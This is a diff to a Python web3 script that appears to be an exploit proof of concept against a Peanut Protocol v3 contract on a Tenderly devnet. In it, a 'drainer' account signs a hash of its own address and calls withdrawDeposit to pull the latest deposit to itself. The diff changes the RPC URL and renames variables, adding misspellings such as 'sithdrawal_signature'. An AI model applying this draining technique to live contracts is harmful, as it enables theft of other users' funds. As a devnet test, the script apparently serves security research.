@@ -7,7 +7,7 @@ from eth_keys.main import PrivateKey
 from eth_abi.encoding import PackedAddressEncoder
 from eth_account.datastructures import SignedMessage
 
-OPTIMISM_TENDERLY_RPC = 'https://rpc.vnet.tenderly.co/devnet/peanut-eco-hack/3659f219-bb8e-43b2-9f21-960049cc91d5'
+OPTIMISM_TENDERLY_RPC = 'https://rpc.vnet.tenderly.co/devnet/peanut-eco-hack/a5f8ebef-0e33-4977-8589-f61e699e5024'
 web3 = Web3(HTTPProvider(OPTIMISM_TENDERLY_RPC))
 
 # Make sure that the devnet is in a clean state
@@ -106,18 +106,18 @@ encoder = PackedAddressEncoder()
 packed_drainer_address = encoder.encode(drainer_account.address)
 
 hashed_packed_drainer_address = web3.keccak(b'\x19Ethereum Signed Message:\n32' + web3.keccak(packed_drainer_address))
-print('Hached packed drainer address', hashed_packed_drainer_address.hex())
+print('Hashed packed drainer address', hashed_packed_drainer_address.hex())
 
-signed_message: SignedMessage = drainer_account.signHash(hashed_packed_drainer_address)
-signature = bytes(signed_message.signature)
-print('Signature', signature.hex())
+signed_withdrawal_message: SignedMessage = drainer_account.signHash(hashed_packed_drainer_address)
+sithdrawal_signature = bytes(signed_withdrawal_message.signature)
+print('Withdrawak signature', sithdrawal_signature.hex())
 
 nonce = web3.eth.get_transaction_count(drainer_account.address) # type: ignore
 tx_params = peanut_v3_contract.functions.withdrawDeposit(
     latest_deposit_idx,
     drainer_account.address,
     hashed_packed_drainer_address,
-    signature
+    sithdrawal_signature
 ).build_transaction({
     'from': drainer_account.address,
     'nonce': nonce
